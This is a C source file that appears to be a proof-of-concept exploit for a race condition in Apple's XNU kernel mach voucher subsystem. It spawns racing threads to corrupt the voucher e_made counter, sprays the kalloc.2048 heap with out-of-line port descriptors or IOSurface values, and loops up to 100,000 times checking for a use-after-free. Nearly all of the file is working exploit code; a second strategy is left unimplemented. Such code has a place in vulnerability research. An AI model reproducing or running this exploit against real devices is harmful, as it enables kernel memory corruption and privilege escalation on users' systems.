#include <mach/mach.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "IOKitLib.h"

#include "spray.h"
#include "voucher.h"
#include "helper.h"
#include "iosurface.h"

#define EMADE_RACE_THREAD 2
// #define EMADE_RACE_THREAD 4

// For OOL_PORTS_DESCRIPTOR heap spray
#define OOL_PORTS 256 // 256 * POINTER == 2048 B <- user_data_content + sizeof(user_data_element) ==  2016 + 32 == 2048 B
#define OOL_MESSAGES 1

#define CONTENT_SIZE 2016 // kalloc.2048 <- not much noise on macos

#define TRIES 100000

#define WAIT 0
#define START 1
#define DONE 2

#define STRATEGY 1
// #define STRATEGY 2

volatile int sync_threads, spray_go;
volatile mach_port_t voucher;
static mach_port_t spray_port;

void * create_thread(void *arg) {
    mach_port_t host;
    mach_voucher_attr_recipe_t store_recipe;

    host = mach_host_self();
    // store_recipe = create_voucher_recipe(CONTENT_SIZE, (uint64_t)arg);
    store_recipe = *(mach_voucher_attr_recipe_t *)arg;

    while (sync_threads == WAIT) {}
    voucher = create_voucher(host, CONTENT_SIZE, store_recipe);

    return NULL;
}

void * release_thread(void *arg) {
    mach_port_t voucher_port;

    voucher_port = *(mach_port_t *)arg;

    while (sync_threads == WAIT) {}
    release_voucher(voucher_port);

    return NULL;
}

void * inc_emade_thread(void *arg) {
    mach_port_t host, previous_voucher;
    int i;
    uint64_t id;

    host = mach_host_self();
    
    id = *(uint64_t *)arg;
    previous_voucher = voucher;
    while (sync_threads == WAIT) {}
    multiple_redeem_voucher(host, CONTENT_SIZE, id, previous_voucher);

    return NULL;
}

mach_port_t * prepare_spray_ports() {
    mach_port_t *ports;
    int i;

    ports = calloc(OOL_PORTS, sizeof(mach_port_t));
    for (i = 0; i < OOL_PORTS; i++) {
        ports[i] = MACH_PORT_NULL; // == 0
        // ports[i] = mach_task_self();
    }

    return ports;
}

struct spray_thread_args {
    mach_port_t spray_port;
    mach_port_t *spray_ports;
    io_connect_t iosurface_client_connection;
    uint32_t surface_id_obj_control;        
};

void * spray_thread(void *arg) {
    struct spray_thread_args args;

    args = *(struct spray_thread_args *)arg;

    while (spray_go == WAIT) {}

    #ifdef SURFACE_SPRAY
    spray_kernel_heap_with_zeroes(&args.iosurface_client_connection, &args.surface_id_obj_control, "spray");
    // io_surface_release(&args.iosurface_client_connection, args.surface_id_obj_control);
    #else
    ool_ports_descriptor_spray(args.spray_port, OOL_MESSAGES, args.spray_ports, OOL_PORTS);
    #endif

    spray_go = DONE;

    return NULL;
}

void strategy_one() {
    mach_port_t host, thread, receive_port, voucher_to_release;
    mach_port_t *spray_ports;
    struct spray_thread_args spray_thread_args;
    kern_return_t kr;
    pthread_t create, release, spray;
    pthread_t inc_emade[EMADE_RACE_THREAD];
    int i, j;
    mach_voucher_attr_recipe_t store_recipe;
    mach_msg_return_t ret;
    io_connect_t iosurface_client_connection;
    uint32_t surface_id_obj_control;        

    host = mach_host_self();

    #ifdef SURFACE_SPRAY
    open_connection_to_iosurface_client(&iosurface_client_connection);
    io_surface_create(&iosurface_client_connection, &surface_id_obj_control);
    spray_thread_args.iosurface_client_connection = iosurface_client_connection;
    spray_thread_args.surface_id_obj_control = surface_id_obj_control;
    #else
    spray_ports = prepare_spray_ports();
    spray_thread_args.spray_ports = spray_ports;
    #endif

    for (j = 0; j < TRIES; j++) {
        store_recipe = create_voucher_recipe(CONTENT_SIZE, j);

        spray_go = START;
        #ifdef SURFACE_SPRAY
        spray_kernel_heap_with_zeroes(&iosurface_client_connection, &surface_id_obj_control, "spray_before");
        #else
        if ((ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &spray_port)) != KERN_SUCCESS)
        {
            ERROR_LOG("receive_port Allocation Failed: %x\n", ret);
            return;
        }
        if ((ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &receive_port)) != KERN_SUCCESS)
        {
            ERROR_LOG("receive_port Allocation Failed: %x\n", ret);
            return;
        }
        spray_thread_args.spray_port = spray_port;

        ool_ports_descriptor_spray(receive_port, OOL_MESSAGES, spray_ports, OOL_PORTS);
        #endif

        voucher = create_voucher(host, CONTENT_SIZE, store_recipe);

        #ifdef SURFACE_SPRAY
        spray_kernel_heap_with_zeroes(&iosurface_client_connection, &surface_id_obj_control, "spray_after");
        #else
        ool_ports_descriptor_spray(receive_port, OOL_MESSAGES, spray_ports, OOL_PORTS);
        #endif

        if (j % 100 == 0) {
            INFO_LOG("attempt: %d\n", j);
        }

        sync_threads = WAIT;
        // race e_made++ (non-atomic increment)
        for (i = 0; i < EMADE_RACE_THREAD; i++) {
            pthread_create(&inc_emade[i], NULL, inc_emade_thread, (void *)&j);
        }


        sync_threads = START;
        for (i = 0; i < EMADE_RACE_THREAD; i++) {
            pthread_join(inc_emade[i], NULL);
        }

        spray_go = WAIT;
        pthread_create(&spray, NULL, spray_thread, (void *)&spray_thread_args);
     
        sync_threads = WAIT;
        // pthread_create(&create, NULL, create_thread, (void *)j);
        pthread_create(&create, NULL, create_thread, (void *)&store_recipe);
        voucher_to_release = voucher;
        pthread_create(&release, NULL, release_thread, (void *)&voucher_to_release);
  
        sync_threads = START;
        pthread_join(create, NULL);
        pthread_join(release, NULL);

        spray_go = START;
        while (spray_go != DONE) {}

        uint32_t out_size = CONTENT_SIZE;
        uint64_t out[CONTENT_SIZE/8];
        kern_return_t mach_voucher_extract_attr_content(ipc_voucher_t voucher, mach_voucher_attr_key_t key,
        mach_voucher_attr_content_t content, mach_msg_type_number_t *contentCnt);        
        kr = mach_voucher_extract_attr_content(voucher, MACH_VOUCHER_ATTR_KEY_USER_DATA, (void *)out, &out_size);
        // kr = mach_voucher_extract_attr_recipe_trap(voucher, MACH_VOUCHER_ATTR_KEY_USER_DATA, recipe, &recipe_size);
        if (kr == KERN_NO_SPACE || sizeof(out) != out_size) {
            printf("UAF?\n");
            break;
        }
        else if (kr != KERN_SUCCESS) {
            printf("kr: 0x%x\n", kr);
        }

        mach_port_destroy(mach_task_self(), voucher);
        #ifdef SURFACE_SPRAY
        io_surface_remove_value_all(&iosurface_client_connection, surface_id_obj_control);
        #else
        mach_port_destroy(mach_task_self(), receive_port);
        mach_port_destroy(mach_task_self(), spray_port);        
        #endif
    }
}

void strategy_two() {
    printf("Not implemented\n");
}

int main(int argc, const char *argv[]) {
    if (STRATEGY == 1) {
        strategy_one();
    } else {
        strategy_two();
    }

    return 0;
}